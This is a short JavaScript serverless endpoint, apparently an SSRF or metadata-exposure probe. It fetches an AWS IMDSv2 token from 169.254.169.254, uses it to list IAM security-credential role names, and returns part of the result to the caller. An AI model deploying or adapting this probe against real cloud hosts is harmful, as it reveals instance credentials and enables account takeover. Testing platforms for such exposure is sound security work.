// api/ssrf-imdsv2.js
export default async function handler(req, res) {
  const results = {};

  // Step 1: Minta token IMDSv2
  try {
    const tokenResp = await fetch(
      'http://169.254.169.254/latest/api/token',
      {
        method: 'PUT',
        headers: {
          'X-aws-ec2-metadata-token-ttl-seconds': '21600'
        }
      }
    );
    results.token_status = tokenResp.status;
    const token = tokenResp.ok ? await tokenResp.text() : null;
    results.token_received = Boolean(token);
    results.token_length = token ? token.length : 0;

    // Step 2: Kalau dapat token, minta IAM role name
    if (token) {
      const iamResp = await fetch(
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        {
          headers: {
            'X-aws-ec2-metadata-token': token
          }
        }
      );
      results.iam_status = iamResp.status;
      results.iam_body = iamResp.ok
        ? (await iamResp.text()).substring(0, 100)
        : null;
    }
  } catch (e) {
    results.error = e.message.substring(0, 200);
  }

  return res.status(200).json(results);
}
